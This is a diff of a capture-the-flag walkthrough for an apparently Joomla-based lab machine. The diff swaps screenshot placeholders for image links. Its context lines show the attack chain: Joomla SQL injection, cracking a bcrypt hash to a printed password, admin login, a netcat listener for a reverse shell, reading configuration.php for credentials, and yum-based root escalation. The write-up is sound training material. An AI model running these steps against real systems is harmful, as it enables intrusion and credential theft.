@@ -8,11 +8,11 @@
 
 1. Enumerate all services running on the target machine with `nmap`
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/0f367f97-c5e1-4f9b-b784-09dea498db3d)
 
 2. Go to the `http://IP/`, the headline article states that **spiderman** robbed the bank
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/1f22d8cb-5efe-47b1-abd9-6e8b63c86ee0)
 
 ---
 
@@ -34,7 +34,7 @@ chmod +x joomscan.pl
 perl joomscan.pl --url http://IP
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/60d0324c-5725-4ffc-b602-62e460c9c3bf)
 
 ---
 
@@ -48,7 +48,7 @@ _Hint: SQLi & JohnTheRipper_
 python3 joomblah.py http://IP/
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/2be7bfda-e461-4c8e-b351-0382301eba6f)
 
 2. Copy the password hash, and crack it with John the Ripper
    - The password is **spiderman123**
@@ -58,7 +58,7 @@ echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah_hash
 john --format=bcrypt --wordlist=/root/Tools/wordlists/rockyou.txt jonah_hash.txt
 ```
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/7f768e70-f9f5-438c-9a68-8d6741014547)
 
 ---
 
@@ -70,7 +70,7 @@ john --format=bcrypt --wordlist=/root/Tools/wordlists/rockyou.txt jonah_hash.txt
 gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/589c0875-eaff-4a3d-8502-a7442b63bbf8)
 
 2. Log in to the Joomla administrator panel at `http://IP/administrator/index.php` with `jonah:spiderman123`
 
@@ -84,7 +84,7 @@ gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-
 nc -lvnp 4444
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/ee0eeda4-1056-406f-ad8a-bc93ab58696b)
 
 5. From the initial shell, examine the website configuration to find credentials
 
@@ -93,7 +93,7 @@ cd /var/www/html
 cat configuration.php
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/6c15cc2b-5c3f-437a-84ff-460c60a48ded)
 
 6. Use the discovered password to switch to the `jjameson` user
 
@@ -104,7 +104,7 @@ su jjameson
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-[SCREEN09]
+![SCREEN09](https://github.com/user-attachments/assets/dbfe8e90-debf-4297-b9ac-6413fef346f2)
 
 7. Retrieve the user flag
 
@@ -112,7 +112,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 cat /home/jjameson/user.txt
 ```
 
-[SCREEN10]
+![SCREEN10](https://github.com/user-attachments/assets/165ae883-e7f1-4b22-a0cc-dcfa842490a1)
 
 ---
 
@@ -124,7 +124,7 @@ cat /home/jjameson/user.txt
 sudo -l
 ```
 
-[SCREEN11]
+![SCREEN11](https://github.com/user-attachments/assets/e41b4c8d-5e61-4674-b20c-6dfc87f93bea)
 
 2. Exploit the `yum` plugin functionality to gain root access using a method from [GTFOBins](https://gtfobins.github.io/gtfobins/yum/)
 
@@ -156,7 +156,7 @@ sudo yum -c $TF/x --enableplugin=y
 whoami
 ```
 
-[SCREEN12]
+![SCREEN12](https://github.com/user-attachments/assets/f21ac23e-00ef-4183-a532-7121cc17cabf)
 
 3. Retrieve the root flag
 
@@ -164,4 +164,4 @@ whoami
 cat /root/root.txt
 ```
 
-[SCREEN13]
+![SCREEN13](https://github.com/user-attachments/assets/420cc685-e8ea-4178-b96e-694e367cce59)
